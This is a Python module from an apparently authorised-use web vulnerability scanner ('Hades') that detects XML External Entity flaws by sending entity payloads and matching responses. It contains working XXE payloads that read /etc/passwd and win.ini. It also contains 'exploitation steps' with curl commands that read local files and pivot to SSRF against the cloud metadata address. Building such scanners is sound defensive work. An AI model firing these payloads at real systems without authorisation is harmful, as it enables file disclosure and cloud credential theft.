"""
xxe_detect — in-band detection of XML External Entity (XXE) processing.

XXE happens when a server parses attacker-supplied XML with an entity-resolving parser left on.
That lets a request pull in local files (``file:///etc/passwd``), reach internal services (SSRF via
XML), or crash the parser. Hades probes every XML-accepting endpoint it can find (form actions,
parametrised URL paths, API/SOAP-looking paths, the site root) with three in-band techniques, from
strongest to weakest:

1. **File disclosure** — an external entity pointing at a local file; a returned ``/etc/passwd`` or
   ``win.ini`` signature is hard proof (``verified``), HIGH.
2. **Custom-entity expansion (canary)** — a benign internal entity whose unique value comes back
   *expanded* in the response proves the parser resolves custom entities (the XXE precondition),
   MEDIUM and ``verified`` from the proof. The raw payload is stripped from the body first so a mere
   reflection of our XML can't be mistaken for real expansion.
3. **Error-based signatures** — parser errors that mention external-entity / file loading hint the
   feature is on without returning content; reported as a MEDIUM indicator (not ``verified``).

Blind XXE (no reflection, no error) is confirmed out-of-band by the ``oob_scan`` profile. Detection
only: the probes read a world-readable file on an authorised target and never write or execute
anything. Skipped in safe mode.
"""
from __future__ import annotations

import re
import secrets
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import unquote, urlparse, urlunparse

import httpx
from loguru import logger

from scanner.engine import Finding, Severity, ScanEngine
from scanner.evidence import from_response, note
from scanner.vulns._common import is_safe_mode

MODULE = "xxe_detect"

# Cap the endpoint surface so an XXE run stays bounded and polite.
_MAX_ENDPOINTS = 15

# Path fragments that strongly suggest an XML / SOAP / API endpoint — probed first.
_XML_HINTS = ("xml", "soap", "wsdl", "xmlrpc", "/rpc", "/api", "/rest", "/feed", "/rss",
              "/service", "/svc", "upload", "import", "parse")

_CT_XML = {"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"}

# File-read signatures: content ONLY a real local file returns (never a substring of our payload).
_FILE_PROBES: list[tuple[str, "re.Pattern[str]", str]] = [
    ("file:///etc/passwd",
     re.compile(r"root:.*?:0:0:", re.I),
     "/etc/passwd (Unix accounts)"),
    ("file:///c:/windows/win.ini",
     re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I),
     "C:/Windows/win.ini (Windows)"),
]

# Error-based signatures: parser messages that betray external-entity / DTD loading. Conservative —
# each names the XML stack rather than a generic word, to avoid false positives on ordinary 500s.
_ERROR_RE = re.compile(
    r"failed to load external entity"
    r"|external entity .*not permitted"
    r"|simplexml_load|DOMDocument|libxml|lxml\.etree|XMLSyntaxError"
    r"|org\.xml\.sax|SAXParseException|javax\.xml|XMLStreamException"
    r"|System\.Xml\.|XmlException"
    r"|start tag expected|premature end of data|undefined entity",
    re.I,
)


# ---------------------------------------------------------------------------
# Endpoint collection
# ---------------------------------------------------------------------------

def _base(url: str) -> str:
    """Drop the query string — XXE is delivered in the request body, not the URL."""
    p = urlparse(url)
    return urlunparse(p._replace(query="", fragment=""))


def _looks_xml(url: str) -> bool:
    low = url.lower()
    return any(h in low for h in _XML_HINTS)


def _candidates(engine: ScanEngine) -> list[str]:
    """Every distinct endpoint worth POSTing XML to, XML/SOAP-looking paths first."""
    crawl = engine.get_crawl()
    urls: list[str] = []
    seen: set[str] = set()

    def add(url: str) -> None:
        b = _base(url)
        if b and b not in seen:
            seen.add(b)
            urls.append(b)

    for form in getattr(crawl, "forms", []):
        if getattr(form, "method", "get").lower() == "post":
            add(form.action)
    for url in getattr(crawl, "parametrised_urls", []):
        add(url)
    add(engine.url)

    urls.sort(key=lambda u: 0 if _looks_xml(u) else 1)
    return urls[:_MAX_ENDPOINTS]


# ---------------------------------------------------------------------------
# Probing
# ---------------------------------------------------------------------------

def _post_xml(engine: ScanEngine, url: str, body: str) -> "httpx.Response | None":
    try:
        return engine.request("POST", url, content=body.encode(), headers=_CT_XML)
    except httpx.HTTPError as exc:
        logger.debug(f"xxe_detect: POST {url} → {exc}")
        return None


def _strip_reflection(text: str, payload: str) -> str:
    """Remove our literal XML from the response so a server that merely echoes the request body
    can't be mistaken for a parser that expanded our entity."""
    decoded = unquote(text)
    return decoded.replace(payload, "").replace(unquote(payload), "")


def _canary_doc(token: str) -> tuple[str, str]:
    """A benign internal-entity document and the value it expands to."""
    value = f"HADES-XXE-{token}"
    doc = (f'<?xml version="1.0" encoding="UTF-8"?>'
           f'<!DOCTYPE hades [<!ENTITY probe "{value}">]>'
           f'<hades>&probe;</hades>')
    return doc, value


def _file_doc(path: str) -> str:
    return (f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE hades [<!ENTITY xxe SYSTEM "{path}">]>'
            f'<hades>&xxe;</hades>')


def _exploitation_steps(url: str) -> list[dict]:
    """Copy-paste verification/escalation for a confirmed XXE (authorised use only)."""
    read = (f"curl -sk -X POST '{url}' -H 'Content-Type: application/xml' "
            "--data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM "
            "\"file:///etc/passwd\">]><r>&x;</r>'")
    ssrf = (f"curl -sk -X POST '{url}' -H 'Content-Type: application/xml' "
            "--data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM "
            "\"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>'")
    return [
        {"step": 1, "description": "Re-read a local file to confirm XXE file disclosure.",
         "command": read},
        {"step": 2, "description": "Pivot to SSRF via XML: reach cloud metadata through the parser.",
         "command": ssrf},
        {"step": 3, "description": "For blind targets, confirm out-of-band with the oob_scan profile "
                                   "(external entity pointing at the Hades listener)."},
    ]


def _finding(url: str, title: str, desc: str, severity: Severity, payload: str,
             resp: "httpx.Response | None", signal: str, *, verified: bool,
             verification: str, confidence: str) -> Finding:
    evidence = [f"POST {url} (Content-Type: application/xml)", f"payload: {note(payload)[:120]}"]
    if resp is not None:
        evidence += from_response(resp, indicator=signal)
    return Finding(
        module=MODULE,
        title=title,
        description=desc,
        severity=severity,
        recommendation=(
            "Disable DTD processing and external-entity resolution in the XML parser "
            "(e.g. libxml `LIBXML_NONET`/`libxml_disable_entity_loader`, Java "
            "`FEATURE_SECURE_PROCESSING` + disallow-doctype-decl, .NET `XmlResolver=null`). "
            "Prefer a hardened parser and reject documents that declare a DOCTYPE."),
        raw={"location": url, "payload": payload, "signal": signal, "confidence": confidence,
             "verified": verified, "verification": verification,
             "evidence": evidence, "exploitation": _exploitation_steps(url)},
    )


def _probe(engine: ScanEngine, url: str) -> Finding | None:
    """Run the three techniques against one endpoint; return the strongest hit."""
    # 1. File disclosure — strongest proof.
    for path, sig_re, what in _FILE_PROBES:
        doc = _file_doc(path)
        resp = _post_xml(engine, url, doc)
        if resp is None:
            continue
        body = _strip_reflection(resp.text, doc)
        if sig_re.search(body):
            return _finding(
                url, f"XXE: local file disclosure at {urlparse(url).path or '/'}",
                (f"The endpoint parses XML with external entities enabled and returned {what} "
                 "via a `file://` SYSTEM entity. An attacker can read local files, reach internal "
                 "services (SSRF), or exfiltrate data out-of-band."),
                Severity.HIGH, doc, resp, f"server returned {what}",
                verified=True, verification=f"external entity resolved — {what} in response",
                confidence="high")

    # 2. Custom-entity expansion (benign canary) — proves entity resolution.
    token = secrets.token_hex(6)
    doc, value = _canary_doc(token)
    resp = _post_xml(engine, url, doc)
    if resp is not None:
        body = _strip_reflection(resp.text, doc)
        if value in body:
            return _finding(
                url, f"XXE: XML entity expansion at {urlparse(url).path or '/'}",
                ("The endpoint resolves custom XML entities: a unique internal-entity value was "
                 "returned expanded in the response, proving DTD/entity processing is enabled — the "
                 "precondition for XML External Entity (XXE) attacks. External-entity file reads and "
                 "SSRF-via-XML are likely possible."),
                Severity.MEDIUM, doc, resp, f"entity expanded to {value}",
                verified=True, verification="custom DTD entity expanded in the response",
                confidence="high")

        # 3. Error-based signature — only when a file probe actually errored on this endpoint.
        if _ERROR_RE.search(resp.text):
            return _finding(
                url, f"XXE: XML parser error signature at {urlparse(url).path or '/'}",
                ("The endpoint accepts XML and its parser leaked an error referencing external-entity "
                 "or DTD loading. This indicates XML parsing with entity handling that may be exploitable; "
                 "confirm with an out-of-band (oob_scan) check."),
                Severity.MEDIUM, doc, resp, "XML parser error referencing external entities",
                verified=False, verification="", confidence="medium")
    return None


def run(engine: ScanEngine) -> list[Finding]:
    if is_safe_mode(engine):
        return [Finding(MODULE, "XXE Scan Skipped (Safe Mode)",
                        "Active XXE probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    endpoints = _candidates(engine)
    if not endpoints:
        return [Finding(MODULE, "XXE: No XML-Accepting Endpoints Found",
                        "No form actions, parametrised URLs or API paths were discovered to test.",
                        Severity.INFO, "", {"confidence": "high"})]

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        futures = {pool.submit(_probe, engine, url): url for url in endpoints}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "XXE: None Detected (in-band)",
                        f"Probed {len(endpoints)} endpoint(s) with entity-expansion and file-read "
                        "payloads. Blind XXE requires an out-of-band test (oob_scan profile).",
                        Severity.INFO, "", {"endpoints_tested": len(endpoints), "confidence": "high"})]
    logger.info(f"xxe_detect: {len(findings)} XXE finding(s) across {len(endpoints)} endpoint(s)")
    return findings
